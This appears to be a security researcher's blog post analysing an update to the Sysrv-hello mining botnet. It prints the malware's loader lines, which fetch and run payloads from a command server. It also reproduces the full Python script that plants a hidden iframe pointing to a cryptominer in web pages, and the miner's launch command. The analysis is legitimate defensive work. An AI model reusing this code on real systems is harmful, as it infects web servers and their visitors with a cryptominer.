29 April 2021 / sysrv

Overview
From the end of last year to now, we have see the uptick of the mining botnet families. While
new families have been popping up, some old ones are get frequently updated. Our BotMon
system has recently reported about the [rinfo][z0miner]. And the latest case comes from
Sysrv-hello. Two security companies have recently analyzed the new variant of the family [1]
[2], but we noticed sysrv's author pushed a new update on April 20, adding a new infection
method, injecting malicious script into the html page and infecting users when they visit the
compromised webpage.

New modules of a.py and BrowserUpdate.exe
We know that sysrv can infect both Linux and Windows systems, and its entry is a script file,
a bash script under Linux, the most common file name is ldr.sh, and a PowerShell script
ldr.ps1 under Windows. We noticed this new update only targets the Linux ldr.sh, which adds
the following code:
curl $cc/BrowserUpdate.exe > /tmp/BrowserUpdate.exe
curl $cc/a.py > /tmp/a.py
python /tmp/a.py &
nohup python /tmp/a.py 1>/dev/null 2>&1 &

You can see that 2 new modules were added: a.py and BrowserUpdate.exe, where a.py will
be executed directly by ldr.sh.
The a.py file is a Python program, with only 20 lines of code.

import os
d = "<iframe src=BrowserUpdate.exe width=1 height=1 frameborder=0></iframe>"
for _dir in ["/var", "/usr/local", "/home", "/opt"]:
for root, dirs, files in os.walk(_dir):
for i in files:
path = os.path.join(root, i)
if os.path.splitext(path)[1] not in [".html", ".php", ".htm", ".jsp",
".asp", ".tpl"]:
continue
try:
with open(path) as f:
data = f.read()
if (d in data) or ("<head>" not in data):
continue
with open(path, "w") as f:
f.write(data.replace("<head>", "<head>"+d))#+'<script
async="async" src="//bmst.pw/6034003x100.js"></script>'))
except:
continue
dst = os.path.join(root, "BrowserUpdate.exe")
os.system("cp -rf /tmp/BrowserUpdate.exe '%s'" % dst)
os.system("rm -rf /tmp/BrowserUpdate.exe")

The function of this code is to go through the directories of "/var", "/usr/local",
"/home" and "/opt" on the infected machine, looking for web files with ".html",
".php", ".htm", ".jsp", ".asp" or ".tpl" suffixes, and inserting an iframe code into
them once found.
<head><iframe src=BrowserUpdate.exe width=1 height=1 frameborder=0></iframe>

So, if someone visits the modified web page, the BrowserUpdate.exe will be downloaded,
here let’s take a look at this exe file.
BrowserUpdate.exe is a PE32 program packed with UPX. VT scan results show that it is a
malicious program of CoinMiner. The exe will release two 64-bit PE files:
CreateFileW("C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\ModuleInstaller.exe",
0x40000000, 0x0, NULL, 0x2, 0x80, 0x0)
CreateFileW("C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\WinRing0x64.sys", 0x40000000,
0x0, NULL, 0x2, 0x80, 0x0)

Then BrowserUpdate.exe will call the two files using the following command.
cmd /c \"%TEMP%\\ModuleInstaller.exe\" --coin monero --donate-level 0 -o xmreu2.nanopool.org:14444 -u

The above command will start mining activity with the assigned pool and wallet. Actually the
released exe and sys belong to a set of xmrig suite, with ModuleInstaller.exe as the main
program which loads WinRing0x64.sys driver. There have been reports about them by other
vendors.

Summary
Through the above analysis, it is easy to see that this update of Sysrv-hello is mainly to
improve the propagation ability, besides making the compromised linux machine a mining
host, by injecting malicious code into the webservers’ html pages, it could potentially infect
visiting users on Windows platform.
Considering that sysrv has been going through several updates, we expect that there might
be more actions coming. We will keep an eye on it.
